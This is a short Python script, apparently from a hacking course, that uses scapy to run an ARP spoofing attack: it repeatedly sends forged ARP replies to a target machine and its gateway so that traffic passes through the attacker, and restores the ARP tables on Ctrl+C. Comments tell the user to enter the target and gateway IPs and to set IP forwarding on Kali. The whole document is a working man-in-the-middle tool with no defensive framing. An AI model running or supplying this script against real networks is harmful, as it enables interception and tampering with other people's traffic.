#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_results = scapy.ARP(pdst=ip)
    broad = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_combo = broad/arp_results
    ans = scapy.srp(arp_combo, timeout=1, verbose=False)[0]

    return (ans[0][1].hwsrc)

def spoof(tar_ip, spoof_ip):
    tar_mac = get_mac(tar_ip)
    packets = scapy.ARP(op=2, pdst=tar_ip, hwdst=tar_mac, psrc=spoof_ip)
    scapy.send(packets, verbose=False)

def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packets = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packets, count=4, verbose=False)

#use (echo 0 > /proc/sys/net/ipv4/ip_forward) before running spoofer on kali or host. Remember to ignore the brackets
#If ech 0 still blocks network on target system change to ech0 1

tar_ip = "192.168.184......"
gateway_ip = "192.168.184....."
#Enter your target IP once scanned for and your real Gateway IP from your Host Machine

try:
    packet_counter = 0
    while True:
        spoof(tar_ip, gateway_ip)
        spoof(gateway_ip, tar_ip)
        packet_counter = packet_counter + 2
        print("\r[+] Packets sent: " + str(packet_counter)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C .....Resetting ARP tables.....Please wait\n")
    restore(tar_ip, gateway_ip)
    restore(gateway_ip, tar_ip)
